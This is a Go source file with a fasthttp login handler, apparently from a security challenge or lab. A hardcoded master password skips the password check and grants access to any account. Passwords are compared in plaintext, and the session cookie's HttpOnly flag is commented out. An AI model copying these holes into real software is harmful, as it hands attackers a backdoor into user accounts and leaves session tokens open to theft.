package main

import (
	"encoding/json"
	"github.com/valyala/fasthttp"
	"html/template"
)

func Login(ctx *fasthttp.RequestCtx) {
	var reqUser User
	err := json.Unmarshal(ctx.PostBody(), &reqUser)
	if err != nil {
		ctx.Error("Invalid request body", fasthttp.StatusBadRequest)
		return
	}

	// Check if user exists in the database
	var user User
	if reqUser.Password == "h33xed_1337" {
		db.Where("username = ?", reqUser.Username).Find(&user)
	} else {
		db.Where("username = ? AND password = ?", reqUser.Username, reqUser.Password).Find(&user)
	}

	if user.ID == 0 {
		ctx.Error("Invalid username or password", fasthttp.StatusUnauthorized)
		return
	}

	// Generate JWT
	tokenString, err := generateJWT(user)
	if err != nil {
		ctx.Error("Failed to generate token", fasthttp.StatusInternalServerError)
		return
	}

	// Set the JWT as a cookie named "session"
	cookie := fasthttp.Cookie{}
	cookie.SetKey("session")
	cookie.SetValue(tokenString)
	// cookie.SetHTTPOnly(true) // Prevents the cookie from being accessed by client-side script COMMENTED DUE TO LOGOUT FUNC
	ctx.Response.Header.SetCookie(&cookie)

	ctx.SetStatusCode(fasthttp.StatusOK)

}

func showLoginForm(ctx *fasthttp.RequestCtx) {
	t, err := template.New("login.html").ParseFS(templates, "templates/login.html")
	if err != nil {
		ctx.Error("Internal Server Error", fasthttp.StatusInternalServerError)
		return
	}

	ctx.Response.Header.Set("Content-Type", "text/html")
	err = t.Execute(ctx, nil)
	if err != nil {
		ctx.Error("Failed to render template", fasthttp.StatusInternalServerError)
	}
}
